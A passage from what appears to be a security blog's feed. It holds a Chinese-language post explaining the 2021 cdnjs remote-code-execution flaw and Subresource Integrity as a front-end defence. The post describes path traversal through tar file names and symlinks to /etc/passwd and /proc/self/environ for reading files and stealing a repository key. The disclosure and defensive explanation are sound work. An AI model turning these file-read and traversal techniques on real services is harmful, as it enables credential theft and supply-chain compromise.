&lt;p&gt;如果對 XSS 挑戰有興趣，可以關注 &lt;a href=&quot;https://twitter.com/intigriti&quot;&gt;Intigriti&lt;/a&gt; 並且等待下一次的挑戰。&lt;/p&gt;

		</content>
	</entry>
	
	<entry>
		<title>從 cdnjs 的漏洞來看前端的供應鏈攻擊與防禦</title>
		<link href="https://tech-blog.cymetrics.io/posts/huli/front-end-supply-chain-attack-cdnjs/"/>
		<updated>2021-08-09T00:00:00-00:00</updated>
		<id>https://tech-blog.cymetrics.io/posts/huli/front-end-supply-chain-attack-cdnjs/</id>
		<content type="html">
		  &lt;h2 id=&quot;%E5%89%8D%E8%A8%80&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%89%8D%E8%A8%80&quot;&gt;#&lt;/a&gt; 前言&lt;/h2&gt;
&lt;p&gt;Supply chain attack，中文翻成供應鏈攻擊，這個手法瞄準了上游的漏洞進行攻擊，因為只要污染了上游，下游也會一併被污染。&lt;/p&gt;
&lt;!-- summary --&gt;
&lt;p&gt;以前端為例，你使用的 npm 套件或是程式碼中引入的第三方 script，這些就叫做「上游」，在使用這些第三方資源的同時，你有意識到這也伴隨了一定的風險嗎？&lt;/p&gt;
&lt;p&gt;這篇文章會以 cdnjs 為例，帶大家看看前端的供應鏈攻擊與防禦。&lt;/p&gt;
&lt;!-- summary --&gt;
&lt;h2 id=&quot;cdnjs&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#cdnjs&quot;&gt;#&lt;/a&gt; cdnjs&lt;/h2&gt;
&lt;p&gt;在寫前端的時候，常常會碰到許多要使用第三方 library 的場合，例如說 jQuery 或者是 Bootstrap 之類的（前者在 npm 上每週 400 萬次下載，後者 300 萬次）。先撇開現在其實大多數都會用 webpack 自己打包這點不談，在以往像這種需求，要嘛就是自己下載一份檔案，要嘛就是找現成的 CDN 來載入。&lt;/p&gt;
&lt;p&gt;而 cdnjs 就是其中一個來源，它的官網長這樣：&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/huli/front-end-supply-chain-attack-cdnjs/cdnjs.png&quot; alt=&quot;cdnjs 截圖&quot;&gt;&lt;figcaption&gt;&lt;p&gt;圖片擷取自 &lt;a href=&quot;https://cdnjs.com/&quot;&gt;cdnjs&lt;/a&gt; 官網&lt;/p&gt;
&lt;/figcaption&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;除了 cdnjs，也有其他提供類似服務的網站，例如說在 &lt;a href=&quot;https://jquery.com/download/&quot;&gt;jQuery&lt;/a&gt; 官網上可以看見他們自己的 &lt;a href=&quot;http://code.jquery.com/&quot;&gt;code.jquery.com&lt;/a&gt; ，而 &lt;a href=&quot;https://getbootstrap.com/&quot;&gt;Bootstrap&lt;/a&gt; 則是使用了另一個叫做 &lt;a href=&quot;https://www.jsdelivr.com/&quot;&gt;jsDelivr&lt;/a&gt; 的服務。&lt;/p&gt;
&lt;p&gt;舉個實際的例子吧！&lt;/p&gt;
&lt;p&gt;假設我現在做的網站需要用到 jQuery，我就要在頁面中用 &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; 標籤載入 jQuery 這個函式庫，而這個來源可以是：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;我自己的網站&lt;/li&gt;
&lt;li&gt;jsDelivr: &lt;a href=&quot;https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js&quot;&gt;https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;cdnjs: &lt;a href=&quot;https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js&quot;&gt;https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;jQuery 官方：&lt;a href=&quot;https://code.jquery.com/jquery-3.6.0.min.js&quot;&gt;https://code.jquery.com/jquery-3.6.0.min.js&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;假設我最後選擇了 jQuery 官方提供的網址，就會寫下這一段 HTML：&lt;/p&gt;
&lt;pre class=&quot;language-html&quot;&gt;&lt;code class=&quot;language-html&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;script&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;https://code.jquery.com/jquery-3.6.0.min.js&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token script&quot;&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;script&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;如此一來，就載入了 jQuery 這個函式庫，其他程式碼就可以使用它所提供的功能。&lt;/p&gt;
&lt;p&gt;那為什麼我要選擇 CDN，而不是選擇下載下來，放在自己的網站上呢？可能有幾個理由：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;懶惰，直接用別人的最快&lt;/li&gt;
&lt;li&gt;預算考量，放別人網站可以節省自己網站流量花費跟負荷&lt;/li&gt;
&lt;li&gt;速度考量&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;第三點速度考量值得特別說明一下，如果載入的函式庫是來自於 CDN，下載的速度可能會比較快。&lt;/p&gt;
&lt;p&gt;比較快的第一個理由是他們本來就是做 CDN 的，所以在不同國家可能都有節點。假設你主機放在美國，那若是放自己網站，台灣的使用者就要連到美國的伺服器去抓這些 library，但如果是用 CDN 提供的網址，可能只要連到台灣的節點就好，省去一些延遲（latency）。&lt;/p&gt;
&lt;p&gt;第二個理由是如果大家都在用這個 CDN，那它被快取住的機率就提高了。例如說，假設 Facebook 也用了 cdnjs 來載入 jQuery 3.6.0 版，那如果我的網站也用了同樣的服務載入了同個 library，對於造訪過 Facebook 的瀏覽器來說，它就不需要再次下載檔案，因為已經下載過，被快取住了。&lt;/p&gt;
&lt;p&gt;（2021-08-09 補充：感謝 Ho Hong Yip 於文章發出後在臉書前端社群的指正，現在的瀏覽器對於快取多加了一個限制，也就是跨網站（更詳細一點說是根據 eTLD+1 來判斷）的快取將會分開。所以就算 Facebook 已經載入 jQuery 3.6.0，使用者造訪你的網站時還是需要再下載一次。更詳細的介紹可以看這篇：&lt;a href=&quot;https://developers.google.com/web/updates/2020/10/http-cache-partitioning&quot;&gt;Gaining security and privacy by partitioning the cache&lt;/a&gt;。如此一來，好像又少了一個用 public CDN 的理由了？但文末有提到 &lt;a href=&quot;https://docs.google.com/document/d/1lQykm9HgzkPlaKXwpQ9vNc3m2Eq2hF4TY-Vup5wg4qg/edit&quot;&gt;Web Shared Libraries&lt;/a&gt; 想解決這個問題，只是看起來還在早期階段。）&lt;/p&gt;
&lt;p&gt;以大家熟悉的 &lt;a href=&quot;https://ithelp.ithome.com.tw/articles?tab=tech&quot;&gt;iT 邦幫忙&lt;/a&gt;網站為例，就有使用到來自於 google 跟 cdnjs 的資源：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/huli/front-end-supply-chain-attack-cdnjs/ithome.png&quot; alt=&quot;ithome&quot;&gt;&lt;/p&gt;
&lt;p&gt;前面講了一些使用第三方 CDN 的優點，那缺點是什麼呢？&lt;/p&gt;
&lt;p&gt;第一個缺點是如果 CDN 掛了，你的網站可能會跟著一起掛，就算不是掛掉，連線緩慢也是一樣。例如說我網站從 cdnjs 載入了 jQuery，可是 cdnjs 突然變得很慢，那我的網站也會變得很慢，一起被牽連。&lt;/p&gt;
&lt;p&gt;而 cdnjs 背後的公司 Cloudflare 確實有&lt;a href=&quot;https://techcrunch.com/2019/06/24/cloudflare-outage-affecting-numerous-sites-on-monday-am/&quot;&gt;出過事&lt;/a&gt;，連帶影響了許多網站。&lt;/p&gt;
&lt;p&gt;第二個缺點是如果 CDN 被駭客入侵了，你引入的函式庫被植入惡意程式碼，那你的網站就會跟著一起被入侵。而這樣子的攻擊手法，就是這篇的主題：「供應鏈攻擊」，從上游入侵，連帶影響到下游。&lt;/p&gt;
&lt;p&gt;有些人可能會想說：「這些大公司不太可能被入侵吧？而且這服務這麼多人用，一定有人在把關吧」&lt;/p&gt;
&lt;p&gt;接著，就讓我們來看一個實際案例。&lt;/p&gt;
&lt;h2 id=&quot;%E8%A7%A3%E6%9E%90-cdnjs-%E7%9A%84-rce-%E6%BC%8F%E6%B4%9E&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E8%A7%A3%E6%9E%90-cdnjs-%E7%9A%84-rce-%E6%BC%8F%E6%B4%9E&quot;&gt;#&lt;/a&gt; 解析 cdnjs 的 RCE 漏洞&lt;/h2&gt;
&lt;p&gt;2021 年 7 月 16 號，一名資安研究員 &lt;a href=&quot;https://twitter.com/ryotkak&quot;&gt;@ryotkak&lt;/a&gt; 在他的部落格上發布了一篇文章，名為：&lt;a href=&quot;https://blog.ryotak.me/post/cdnjs-remote-code-execution-en/&quot;&gt;Remote code execution in cdnjs of Cloudflare&lt;/a&gt;（以下用「作者」來稱呼）。&lt;/p&gt;
&lt;p&gt;Remote code execution 簡稱為 RCE，這種漏洞可以讓攻擊者執行任意程式碼，是風險等級很高的漏洞。而作者發現了一個 cdnjs 的 RCE 漏洞，若是有心利用這個漏洞的話，可以控制整個 cdnjs 的服務。&lt;/p&gt;
&lt;p&gt;作者的部落格文章把過程寫得十分詳細，我在這邊簡單講一下漏洞是怎麼形成的，一共有兩個漏洞。&lt;/p&gt;
&lt;p&gt;首先呢，Cloudflare 有把 cdnjs 相關的程式碼開源在 GitHub 上面，而其中有一個自動更新的功能引起了作者的注意。這個功能會自動去抓 npm 上打包好的 package 檔案，格式是壓縮檔 .tgz，解壓縮之後把檔案做一些處理，複製到合適的位置。&lt;/p&gt;
&lt;p&gt;而作者知道在 Go 裡面如果用 &lt;code&gt;archive/tar&lt;/code&gt; 來解壓縮的話可能會有漏洞，因為解壓縮出來的檔案沒有經過處理，所以檔名可以長得像是這樣：&lt;code&gt;../../../../../tmp/temp&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;長成這樣有什麼問題呢？&lt;/p&gt;
&lt;p&gt;假設今天你有一段程式碼是複製檔案，然後做了類似底下的操作：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;用目的地 + 檔名拼湊出目標位置，建立新檔案&lt;/li&gt;
&lt;li&gt;讀取原本檔案，寫入新檔案&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;如果目的地是 &lt;code&gt;/packages/test&lt;/code&gt;，檔名是 &lt;code&gt;abc.js&lt;/code&gt;，那最後就會在 &lt;code&gt;/packages/test/abc.js&lt;/code&gt; 產生新的檔案。&lt;/p&gt;
&lt;p&gt;這時候若是目的地一樣，檔名是 &lt;code&gt;../../../tmp/abc.js&lt;/code&gt;，就會在 &lt;code&gt;/package/test/../../../tmp/abc.js&lt;/code&gt; 也就是 &lt;code&gt;/tmp/abc.js&lt;/code&gt; 底下寫入檔案。&lt;/p&gt;
&lt;p&gt;因此透過這樣的手法，可以寫入檔案到任何有權限的地方！而 cdnjs 的程式碼就有類似的漏洞，能夠寫入檔案到任意位置。如果能利用這漏洞，去覆蓋掉原本就會定時自動執行的檔案的話，就可以達成 RCE 了。&lt;/p&gt;
&lt;p&gt;當作者正想要做個 POC 來驗證的時候，突然很好奇針對 Git 自動更新的功能是怎麼做的（上面講的關於壓縮檔的是針對 npm 的）&lt;/p&gt;
&lt;p&gt;而研究過後，作者發現關於 Git repo 的自動更新，有一段複製檔案的程式碼，長這個樣子：&lt;/p&gt;
&lt;pre class=&quot;language-go&quot;&gt;&lt;code class=&quot;language-go&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;func&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;MoveFile&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;sourcePath&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; destPath &lt;span class=&quot;token builtin&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token builtin&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;    inputFile&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; err &lt;span class=&quot;token operator&quot;&gt;:=&lt;/span&gt; os&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;Open&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;sourcePath&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; err &lt;span class=&quot;token operator&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;token boolean&quot;&gt;nil&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; fmt&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;Errorf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;Couldn&#39;t open source file: %s&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; err&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;    outputFile&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; err &lt;span class=&quot;token operator&quot;&gt;:=&lt;/span&gt; os&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;Create&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;destPath&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; err &lt;span class=&quot;token operator&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;token boolean&quot;&gt;nil&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;        inputFile&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;Close&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; fmt&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;Errorf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;Couldn&#39;t open dest file: %s&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; err&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;defer&lt;/span&gt; outputFile&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;Close&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token boolean&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; err &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; io&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;Copy&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;outputFile&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; inputFile&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;    inputFile&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;Close&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; err &lt;span class=&quot;token operator&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;token boolean&quot;&gt;nil&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; fmt&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;Errorf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;Writing to output file failed: %s&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; err&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token comment&quot;&gt;// The copy was successful, so now delete the original file&lt;/span&gt;&lt;br&gt;    err &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; os&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;Remove&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;sourcePath&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; err &lt;span class=&quot;token operator&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;token boolean&quot;&gt;nil&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; fmt&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;Errorf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;Failed removing original file: %s&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; err&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token boolean&quot;&gt;nil&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;看起來沒什麼，就是複製檔案而已，開啟一個新檔案，把舊檔案的內容複製進去。&lt;/p&gt;
&lt;p&gt;但如果這個原始檔案是個 symbolic link 的話，就不一樣了。在繼續往下之前，先簡單介紹一下什麼是 symbolic link。&lt;/p&gt;
&lt;p&gt;Symbolic link 的概念有點像是以前在 Windows 上看到的「捷徑」，這個捷徑本身只是一個連結，連到真正的目標去。&lt;/p&gt;
&lt;p&gt;在類 Unix 系統裡面可以用 &lt;code&gt;ln -s 目標檔案 捷徑名稱&lt;/code&gt; 去建立一個 symbolic link，這邊直接舉一個例子會更好懂。&lt;/p&gt;
&lt;p&gt;我先建立一個檔案，內容是 hello，位置是 &lt;code&gt;/tmp/hello&lt;/code&gt;。接著我在當前目錄底下建立一個 symbolic link，指到剛剛建立好的 hello 檔案：&lt;code&gt;ln -s /tmp/hello link_file&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;接著我如果印出 &lt;code&gt;link_file&lt;/code&gt; 的內容，會出現 &lt;code&gt;hello&lt;/code&gt;，因為其實就是在印出 &lt;code&gt;/tmp/hello&lt;/code&gt; 的內容。如果我對 &lt;code&gt;link_file&lt;/code&gt; 寫入資料，實際上也是對 &lt;code&gt;/tmp/hello&lt;/code&gt; 寫入。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/huli/front-end-supply-chain-attack-cdnjs/terminal.png&quot; alt=&quot;terminal&quot;&gt;&lt;/p&gt;
&lt;p&gt;再來我們試試看用 Node.js 寫一段複製檔案的程式碼，看看會發生什麼事：&lt;/p&gt;
&lt;pre class=&quot;language-js&quot;&gt;&lt;code class=&quot;language-js&quot;&gt;node &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;e &lt;span class=&quot;token string&quot;&gt;&#39;require(&quot;fs&quot;).copyFileSync(&quot;link_file&quot;, &quot;test.txt&quot;)&#39;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;執行完成之後，我們發現目錄底下多了一個 &lt;code&gt;test.txt&lt;/code&gt; 的檔案，內容是 &lt;code&gt;/tmp/hello&lt;/code&gt; 的檔案內容。&lt;/p&gt;
&lt;p&gt;所以用程式在執行複製檔案時，並不是「複製一個 symbolic link」，而是「複製指向的檔案內容」。&lt;/p&gt;
&lt;p&gt;因此呢，我們剛剛提到的 Go 複製檔案的程式碼，如果有個檔案是指向 &lt;code&gt;/etc/passwd&lt;/code&gt; 的 symbolic link，複製完以後就會產生出一個內容是 &lt;code&gt;/etc/passwd&lt;/code&gt; 的檔案。&lt;/p&gt;
&lt;p&gt;我們可以在 Git 的檔案裡面加一個 symbolic link 名稱叫做 &lt;code&gt;test.js&lt;/code&gt;，讓它指向 &lt;code&gt;/etc/passwd&lt;/code&gt;，這樣被 cdnjs 複製過後，就會產生一個 test.js 的檔案，而且裡面是 &lt;code&gt;/etc/passwd&lt;/code&gt; 的內容！&lt;/p&gt;
&lt;p&gt;如此一來，就得到了一個任意檔案讀取（Arbitrary File Read）的漏洞。&lt;/p&gt;
&lt;p&gt;講到這邊稍微做個總結，作者一共找到兩個漏洞，一個可以寫檔案一個可以讀檔案，寫檔案如果不小心覆蓋重要檔案會讓系統掛掉，因此作者決定從讀檔案開始做 POC，自己建了一個 Git 倉庫然後發佈新版本，等 cdnjs 去自動更新，最後觸發檔案讀取的漏洞，在 cdnjs 發布的 JS 上面就可以看到讀到的檔案內容。&lt;/p&gt;
&lt;p&gt;而作者讀的檔案是 &lt;code&gt;/proc/self/environ&lt;/code&gt;（他本來是想讀另一個 &lt;code&gt;/proc/self/maps&lt;/code&gt;），這裡面有著環境變數，而且有一把 GitHub 的 api key 也在裡面，這把 key 對 cdnjs 底下的 repo 有寫入權限，所以利用這把 key，可以直接去改 cdnjs 或是 cdnjs 網站的程式碼，進而控制整個服務。&lt;/p&gt;
&lt;p&gt;以上就是關於 cdnjs 漏洞的解釋，想看更多技術細節或是詳細發展的話，可以去看原作者的部落格文章，裡面記錄了許多細節。總之呢，就算是大公司在維護的服務，也是有被入侵的風險存在。&lt;/p&gt;
&lt;p&gt;而 Cloudflare 也在一週後發佈了事件處理報告：&lt;a href=&quot;https://blog.cloudflare.com/cloudflares-handling-of-an-rce-vulnerability-in-cdnjs/&quot;&gt;Cloudflare&#39;s Handling of an RCE Vulnerability in cdnjs&lt;/a&gt;，記錄了事情發生的始末以及事後的修補措施，他們把整個架構都重寫了，把原本解壓縮的部分放到 Docker sandbox 裡面，增加了整體的安全性。&lt;/p&gt;
&lt;h2 id=&quot;%E8%BA%AB%E7%82%BA%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%B8%AB%EF%BC%8C%E8%A9%B2%E5%A6%82%E4%BD%95%E9%98%B2%E7%A6%A6%EF%BC%9F&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E8%BA%AB%E7%82%BA%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%B8%AB%EF%BC%8C%E8%A9%B2%E5%A6%82%E4%BD%95%E9%98%B2%E7%A6%A6%EF%BC%9F&quot;&gt;#&lt;/a&gt; 身為前端工程師，該如何防禦？&lt;/h2&gt;
&lt;p&gt;那我們究竟該如何防禦這類型的漏洞？或搞不好，我們根本防禦不了？&lt;/p&gt;
&lt;p&gt;瀏覽器其實有提供一個功能：「如果檔案被竄改過，就不要載入」，這樣僅管 cdnjs 被入侵，jQuery 的檔案被竄改，我的網站也不會載入新的 jQuery 檔案，免於檔案污染的攻擊。&lt;/p&gt;
&lt;p&gt;在 cdnjs 上面，當你決定要用某一個 library 的時候，你可以選擇要複製 URL 還是複製 script tag，若是選擇後者，就會得到這樣的內容：&lt;/p&gt;
&lt;pre class=&quot;language-html&quot;&gt;&lt;code class=&quot;language-html&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;script&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token attr-name&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;https://cdnjs.cloudflare.com/ajax/libs/react/17.0.2/umd/react.production.min.js&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token attr-name&quot;&gt;integrity&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;sha512-TS4lzp3EVDrSXPofTEu9VDWDQb7veCZ5MOm42pzfoNEVqccXWvENKZfdm5lH2c/NcivgsTDw9jVbK+xeYfzezw==&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token attr-name&quot;&gt;crossorigin&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;anonymous&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token attr-name&quot;&gt;referrerpolicy&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;no-referrer&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token script&quot;&gt;&lt;span class=&quot;token language-javascript&quot;&gt;&lt;br&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;script&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;crossorigin=&amp;quot;anonymous&amp;quot;&lt;/code&gt; 這個我在之前的文章：&lt;a href=&quot;https://blog.huli.tw/2021/07/10/cookie-bomb/&quot;&gt;利用 Cookie 特性進行的 DoS 攻擊：Cookie 炸彈&lt;/a&gt;有提過，利用 CORS 的方式送出 request，可以避免把 cookie 一起帶到後端去。&lt;/p&gt;
&lt;p&gt;而上面的另一個標籤 &lt;code&gt;integrity&lt;/code&gt; 才是防禦的重點，這個屬性會讓瀏覽器幫你確認要載入的資源是否符合提供的 hash 值，如果不符合的話，就代表檔案被竄改過，就不會載入資源。所以，就算 cdnjs 被入侵了，駭客替換掉了我原本使用的 react.js，瀏覽器也會因為 hash 值不合，不會載入被污染過的程式碼。&lt;/p&gt;
&lt;p&gt;想知道更多的話可以參考 MDN，上面有一頁 &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity&quot;&gt;Subresource Integrity&lt;/a&gt; 專門在講這個。&lt;/p&gt;
&lt;p&gt;不過這種方法只能防止「已經引入的 script」被竄改，如果碰巧在駭客竄改檔案之後才複製 script，那就沒有用了，因為那時候的檔案已經是竄改過的檔案了。&lt;/p&gt;
